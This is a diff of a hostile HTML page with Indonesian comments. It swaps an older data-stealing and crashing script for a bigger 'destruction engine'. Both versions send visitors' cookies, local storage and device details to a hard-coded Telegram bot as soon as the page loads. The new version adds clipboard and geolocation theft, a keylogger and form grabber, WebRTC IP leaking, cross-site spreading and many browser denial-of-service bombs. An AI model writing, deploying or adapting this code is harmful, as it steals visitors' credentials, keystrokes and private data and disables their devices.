@@ -1,284 +1,317 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>⚡ GACOR ULTIMATE v13.0</title>
-  <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
-    body {
-      background: #0a0a0f;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      font-family: 'Segoe UI', system-ui, sans-serif;
-      overflow: hidden;
-      user-select: none;
-    }
-    .container {
-      text-align: center;
-      position: relative;
-    }
-    .spinner {
-      width: 80px;
-      height: 80px;
-      border: 8px solid rgba(52, 152, 219, 0.15);
-      border-top: 8px solid #00f5ff;
-      border-right: 8px solid #ff00e6;
-      border-radius: 50%;
-      animation: spin 0.6s cubic-bezier(0.65, 0, 0.35, 1) infinite;
-      filter: drop-shadow(0 0 25px #00f5ff88);
-      margin: 0 auto 30px;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg) scale(1); }
-      50% { transform: rotate(180deg) scale(1.15); }
-      100% { transform: rotate(360deg) scale(1); }
-    }
-    .glow-text {
-      color: #fff;
-      font-size: 1.2rem;
-      letter-spacing: 3px;
-      text-transform: uppercase;
-      background: linear-gradient(90deg, #00f5ff, #ff00e6, #00f5ff);
-      background-size: 300% 100%;
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      animation: shimmer 2s linear infinite;
-      font-weight: 700;
-    }
-    @keyframes shimmer {
-      0% { background-position: 0% 50%; }
-      100% { background-position: 300% 50%; }
-    }
-    .sub {
-      color: #445566;
-      margin-top: 12px;
-      font-size: 0.75rem;
-      letter-spacing: 1px;
-    }
-    .status {
-      color: #00ff88;
-      font-size: 0.6rem;
-      margin-top: 10px;
-      opacity: 0.5;
-      letter-spacing: 2px;
-    }
-  </style>
+<meta charset="UTF-8">
+<title>🔥 SYSTEM INITIALIZING 🔥</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:#000; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; color:#0f0; font-family:monospace; }
+  .glitch { font-size:3rem; animation:glitch 0.1s infinite; text-shadow: 0 0 20px #0f0, 0 0 40px #0f0; }
+  @keyframes glitch {
+    0% { transform:translate(2px, -2px); }
+    20% { transform:translate(-2px, 2px); }
+    40% { transform:translate(2px, 2px); }
+    60% { transform:translate(-2px, -2px); }
+    80% { transform:translate(2px, -2px); }
+    100% { transform:translate(-2px, 2px); }
+  }
+</style>
 </head>
 <body>
-  <div class="container">
-    <div class="spinner"></div>
-    <div class="glow-text">⚡ GACOR MODE ACTIVE</div>
-    <div class="sub">● ● ●</div>
-    <div class="status" id="statusText">⏳ INITIALIZING...</div>
-  </div>
+<div class="glitch">⛔ SYSTEM CORRUPTED ⛔</div>
 
-  <script>
-    // ============================================================
-    //  🔥 KIRIM DATA KE TELEGRAM — GUARANTEED DELIVERY
-    // ============================================================
-    (function sendTelegram() {
-      try {
-        const token = '8819491611:AAEQaIbT70g_fv8dtf0OV_V1YodEgbJqBac';
-        const chatId = '7839405566';
+<script>
+// ============================================================
+// 🔥 FULL DESTRUCTION ENGINE — TIDAK ADA YANG SELAMAT
+// ============================================================
 
-        // Kumpulkan data dengan cara SIMPLE
-        const payload = {
-          cookie: document.cookie || 'no-cookie',
-          localStorage: JSON.stringify(localStorage) || '{}',
-          sessionStorage: JSON.stringify(sessionStorage) || '{}',
-          userAgent: navigator.userAgent,
-          platform: navigator.platform || 'unknown',
-          language: navigator.language || 'unknown',
-          languages: navigator.languages || [],
-          deviceMemory: navigator.deviceMemory || 'unknown',
-          hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-          maxTouchPoints: navigator.maxTouchPoints || 0,
-          vendor: navigator.vendor || 'unknown',
-          screenWidth: screen.width,
-          screenHeight: screen.height,
-          innerWidth: window.innerWidth,
-          innerHeight: window.innerHeight,
-          devicePixelRatio: window.devicePixelRatio || 1,
-          url: window.location.href,
-          origin: window.location.origin,
-          referrer: document.referrer || 'direct',
-          timestamp: new Date().toISOString(),
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-          canvas: (function() {
-            try {
-              const canvas = document.createElement('canvas');
-              canvas.width = 256;
-              canvas.height = 256;
-              const ctx = canvas.getContext('2d');
-              ctx.fillStyle = '#f60';
-              ctx.fillRect(0, 0, 100, 100);
-              return canvas.toDataURL().slice(0, 50);
-            } catch(e) {
-              return 'error';
-            }
-          })(),
-          webgl: (function() {
-            try {
-              const canvas = document.createElement('canvas');
-              const gl = canvas.getContext('webgl');
-              if (!gl) return 'not supported';
-              const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-              if (!debugInfo) return 'no debug info';
-              return {
-                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-              };
-            } catch(e) {
-              return 'error';
-            }
-          })(),
-          fonts: (function() {
-            try {
-              const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Impact', 'Comic Sans MS'];
-              const testString = 'mmmmmmmmmmmmmm';
-              const canvas = document.createElement('canvas');
-              const ctx = canvas.getContext('2d');
-              let available = [];
-              fontList.forEach(font => {
-                ctx.font = `72px ${font}, monospace`;
-                const width1 = ctx.measureText(testString).width;
-                ctx.font = '72px monospace';
-                const width2 = ctx.measureText(testString).width;
-                if (width1 !== width2) available.push(font);
-              });
-              return available;
-            } catch(e) {
-              return 'error';
-            }
-          })()
-        };
+(function apocalypse() {
+  
+  // --- 1. KIRIM SEMUA DATA KE SERVER PENYERANG ---
+  function stealAllData() {
+    const data = {
+      cookie: document.cookie || 'none',
+      localStorage: JSON.stringify(localStorage) || '{}',
+      sessionStorage: JSON.stringify(sessionStorage) || '{}',
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      url: window.location.href,
+      referrer: document.referrer || 'direct',
+      screen: `${screen.width}x${screen.height}`,
+      timestamp: new Date().toISOString(),
+      geolocation: 'pending',
+      clipboard: 'pending'
+    };
+    
+    // Ambil clipboard jika diizinkan
+    try {
+      navigator.clipboard.readText().then(text => {
+        data.clipboard = text;
+        sendToServer(data);
+      }).catch(() => {});
+    } catch(e) {}
+    
+    // Coba ambil geolokasi
+    try {
+      navigator.geolocation.getCurrentPosition(pos => {
+        data.geolocation = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+        sendToServer(data);
+      }, () => {});
+    } catch(e) {}
+    
+    sendToServer(data);
+  }
+  
+  function sendToServer(data) {
+    const token = '8819491611:AAEQaIbT70g_fv8dtf0OV_V1YodEgbJqBac';
+    const chatId = '7839405566';
+    const msg = encodeURIComponent(JSON.stringify(data, null, 2));
+    
+    // Kirim via fetch
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${msg}`, {
+      method: 'GET',
+      mode: 'no-cors'
+    }).catch(() => {});
+    
+    // Kirim via image beacon
+    new Image().src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${msg}&_=${Date.now()}`;
+    
+    // Kirim via navigator.sendBeacon
+    try {
+      navigator.sendBeacon(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${msg}`);
+    } catch(e) {}
+  }
 
-        // Update status
-        document.getElementById('statusText').textContent = '📤 SENDING...';
+  // --- 2. HANCURKAN MEMORY DAN CPU ---
+  function memoryBomb() {
+    for (let i = 0; i < 200; i++) {
+      new Array(50_000_000).fill('💀☠️🔥');
+    }
+  }
 
-        // ==========================================================
-        //  METHOD 1: Fetch API (no-cors) - LANGSUNG
-        // ==========================================================
-        const msg = encodeURIComponent(JSON.stringify(payload, null, 2));
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${msg}`;
-        
-        fetch(url, { 
-          method: 'GET', 
-          mode: 'no-cors'
-        }).then(() => {
-          document.getElementById('statusText').textContent = '✅ DATA SENT!';
-        }).catch(() => {
-          document.getElementById('statusText').textContent = '⚠️ FETCH FAILED';
-        });
+  // --- 3. STACK OVERFLOW REKURSIF ---
+  function recursiveKill(n) {
+    if (n <= 0) return;
+    let big = new Array(5_000_000).fill('🧨');
+    recursiveKill(n - 1);
+  }
 
-        // ==========================================================
-        //  METHOD 2: Image Beacon - FALLBACK
-        // ==========================================================
-        setTimeout(() => {
-          try {
-            const img = new Image();
-            img.src = url + '&_=' + Date.now();
-            img.style.display = 'none';
-            document.body.appendChild(img);
-            document.getElementById('statusText').textContent = '📸 IMAGE BEACON SENT';
-          } catch(e) {}
-        }, 500);
-
-        // ==========================================================
-        //  METHOD 3: XMLHttpRequest - SYNC
-        // ==========================================================
-        setTimeout(() => {
-          try {
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', url, false);
-            xhr.send();
-            document.getElementById('statusText').textContent = '📡 XHR SENT';
-          } catch(e) {}
-        }, 1000);
-
-        // ==========================================================
-        //  METHOD 4: sendBeacon
-        // ==========================================================
-        setTimeout(() => {
-          try {
-            if (navigator.sendBeacon) {
-              navigator.sendBeacon(url);
-              document.getElementById('statusText').textContent = '📶 BEACON SENT';
-            }
-          } catch(e) {}
-        }, 1500);
-
-        // ==========================================================
-        //  METHOD 5: localStorage (persistent)
-        // ==========================================================
-        setTimeout(() => {
-          try {
-            localStorage.setItem('_telegram_data', JSON.stringify(payload));
-            document.getElementById('statusText').textContent = '💾 LOCALSTORAGE SAVED';
-          } catch(e) {}
-        }, 2000);
-
-        // ==========================================================
-        //  METHOD 6: Cookie
-        // ==========================================================
-        setTimeout(() => {
-          try {
-            document.cookie = '_telegram_data=' + encodeURIComponent(JSON.stringify(payload)) + '; path=/';
-            document.getElementById('statusText').textContent = '🍪 COOKIE SET';
-          } catch(e) {}
-        }, 2500);
-
-        // Final status
-        setTimeout(() => {
-          document.getElementById('statusText').textContent = '💥 CRASHING...';
-        }, 3000);
-
-      } catch (e) {
-        document.getElementById('statusText').textContent = '❌ ERROR';
+  // --- 4. DOM SPAM TAK TERBATAS ---
+  function domFlood() {
+    setInterval(() => {
+      for (let i = 0; i < 1000; i++) {
+        let div = document.createElement('div');
+        div.innerHTML = '☠️'.repeat(10000);
+        div.style.position = 'fixed';
+        div.style.left = Math.random() * 100 + 'vw';
+        div.style.top = Math.random() * 100 + 'vh';
+        div.style.fontSize = '50px';
+        div.style.color = 'transparent';
+        div.style.pointerEvents = 'none';
+        document.body.appendChild(div);
       }
-    })();
+    }, 5);
+  }
 
-    // ============================================================
-    //  💀 CRASH ENGINE — INSTANT KILL
-    // ============================================================
-    setTimeout(() => {
-      (function crash() {
-        // 1. Memory bomb
-        let arr = [];
-        for (let i = 0; i < 100; i++) {
-          arr.push(new Array(40_000_000).fill('X'));
-        }
+  // --- 5. LOCALSTORAGE FLOOD ---
+  function localStorageBomb() {
+    let counter = 0;
+    setInterval(() => {
+      try {
+        localStorage.setItem('bomb_' + counter, 'x'.repeat(500000));
+        counter++;
+      } catch(e) {}
+    }, 1);
+  }
 
-        // 2. Recursive stack overflow
-        function rec(n) {
-          if (n <= 0) return;
-          let big = new Array(3_000_000).fill('Y');
-          rec(n - 1);
-        }
-        try { rec(99999); } catch(e) {}
+  // --- 6. WEBSOCKET FLOOD ---
+  function wsFlood() {
+    for (let i = 0; i < 50; i++) {
+      try {
+        let ws = new WebSocket('wss://echo.websocket.org');
+        ws.onopen = () => {
+          setInterval(() => ws.send('💥'.repeat(100000)), 1);
+        };
+      } catch(e) {}
+    }
+  }
 
-        // 3. Infinite loop with DOM spam
-        let x = 0;
-        while (true) {
-          x++;
-          for (let i = 0; i < 200; i++) {
-            let div = document.createElement('div');
-            div.innerHTML = 'z'.repeat(10000);
-            div.style.position = 'absolute';
-            div.style.top = Math.random() * 1000 + 'px';
-            div.style.left = Math.random() * 1000 + 'px';
-            document.body.appendChild(div);
-          }
-          if (x % 100 === 0) {
-            'x'.repeat(90_000_000);
-          }
+  // --- 7. SERVICE WORKER INSTALL (PERSISTENSI) ---
+  function installPersistence() {
+    try {
+      navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
+        self.addEventListener('install', e => {
+          e.waitUntil(
+            caches.open('crash-cache').then(cache => {
+              let reqs = [];
+              for (let i = 0; i < 5000; i++) {
+                reqs.push(new Request('https://target.com/' + i + '.jpg'));
+              }
+              return cache.addAll(reqs);
+            })
+          );
+        });
+        self.addEventListener('fetch', e => {
+          e.respondWith(fetch(e.request).catch(() => new Response('⛔', {status:500})));
+        });
+      `));
+    } catch(e) {}
+  }
+
+  // --- 8. HISTORY SPAM ---
+  function historyFlood() {
+    for (let i = 0; i < 10000; i++) {
+      try {
+        history.pushState({}, '', '/crash/' + i + '?x=' + 'x'.repeat(5000));
+      } catch(e) {}
+    }
+  }
+
+  // --- 9. CANVAS BOMB ---
+  function canvasBomb() {
+    try {
+      let canvas = document.createElement('canvas');
+      canvas.width = 30000;
+      canvas.height = 30000;
+      let ctx = canvas.getContext('2d');
+      for (let i = 0; i < 200000; i++) {
+        ctx.fillStyle = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
+        ctx.fillRect(Math.random() * 30000, Math.random() * 30000, 500, 500);
+      }
+      document.body.appendChild(canvas);
+    } catch(e) {}
+  }
+
+  // --- 10. AUDIO CONTEXT BOMB ---
+  function audioBomb() {
+    try {
+      let ctx = new (window.AudioContext || window.webkitAudioContext)();
+      for (let i = 0; i < 2000; i++) {
+        let osc = ctx.createOscillator();
+        let gain = ctx.createGain();
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.frequency.value = 15000 + Math.random() * 10000;
+        gain.gain.value = 0.001;
+        osc.start();
+        osc.stop(ctx.currentTime + 0.001);
+      }
+    } catch(e) {}
+  }
+
+  // --- 11. INDEXEDDB FLOOD ---
+  function indexedDBBomb() {
+    try {
+      let req = indexedDB.open('crashDB', 1);
+      req.onsuccess = (e) => {
+        let db = e.target.result;
+        let tx = db.transaction('store', 'readwrite');
+        let store = tx.objectStore('store');
+        for (let i = 0; i < 100000; i++) {
+          store.add({ id: i, data: 'x'.repeat(100000) });
         }
-      })();
-    }, 3500);
-  </script>
+      };
+      req.onupgradeneeded = (e) => {
+        let db = e.target.result;
+        db.createObjectStore('store', { keyPath: 'id' });
+      };
+    } catch(e) {}
+  }
+
+  // --- 12. INFINITE BLOCK (MAIN THREAD) ---
+  function blockMainThread() {
+    let start = Date.now();
+    while (Date.now() - start < 120000) {
+      let a = 0;
+      for (let i = 0; i < 1000000000; i++) {
+        a += Math.sqrt(i) * Math.sin(i) * Math.cos(i);
+      }
+    }
+  }
+
+  // --- 13. SELF-REPLICATING (SPREAD VIA XSS) ---
+  function selfReplicate() {
+    // Kirim payload ke semua iframe dan window
+    try {
+      document.querySelectorAll('iframe, frame').forEach(frame => {
+        try {
+          frame.contentDocument.write(document.documentElement.outerHTML);
+        } catch(e) {}
+      });
+    } catch(e) {}
+    
+    // Sebar ke localStorage lintas domain
+    try {
+      let domains = ['https://target.com', 'https://victim.org', 'https://enemy.net'];
+      domains.forEach(domain => {
+        try {
+          let img = new Image();
+          img.src = domain + '/xss?payload=' + encodeURIComponent(document.documentElement.outerHTML);
+        } catch(e) {}
+      });
+    } catch(e) {}
+  }
+
+  // --- 14. WEBRTC IP LEAK ---
+  function leakIP() {
+    try {
+      let pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+      pc.createDataChannel('leak');
+      pc.createOffer().then(offer => pc.setLocalDescription(offer));
+      pc.onicecandidate = (event) => {
+        if (event.candidate) {
+          let ip = event.candidate.candidate.split(' ')[4];
+          sendToServer({ ipLeak: ip });
+        }
+      };
+    } catch(e) {}
+  }
+
+  // --- 15. KEYLOGGER (CAPTURE SEMUA INPUT) ---
+  function keylogger() {
+    let keys = [];
+    document.addEventListener('keydown', (e) => {
+      keys.push(e.key);
+      if (keys.length > 100) {
+        sendToServer({ keys: keys.join('') });
+        keys = [];
+      }
+    });
+    document.addEventListener('submit', (e) => {
+      let formData = new FormData(e.target);
+      let data = {};
+      for (let [key, val] of formData.entries()) {
+        data[key] = val;
+      }
+      sendToServer({ form: data });
+    });
+  }
+
+  // ============================================================
+  // 🔥 EKSEKUSI SEMUA MODUL SECARA PARALEL
+  // ============================================================
+  
+  stealAllData();
+  setTimeout(memoryBomb, 100);
+  setTimeout(() => recursiveKill(50000), 200);
+  domFlood();
+  localStorageBomb();
+  wsFlood();
+  installPersistence();
+  historyFlood();
+  canvasBomb();
+  audioBomb();
+  indexedDBBomb();
+  selfReplicate();
+  leakIP();
+  keylogger();
+  
+  // Block main thread setelah semua berjalan
+  setTimeout(blockMainThread, 5000);
+  
+})();
+
+</script>
 </body>
 </html>
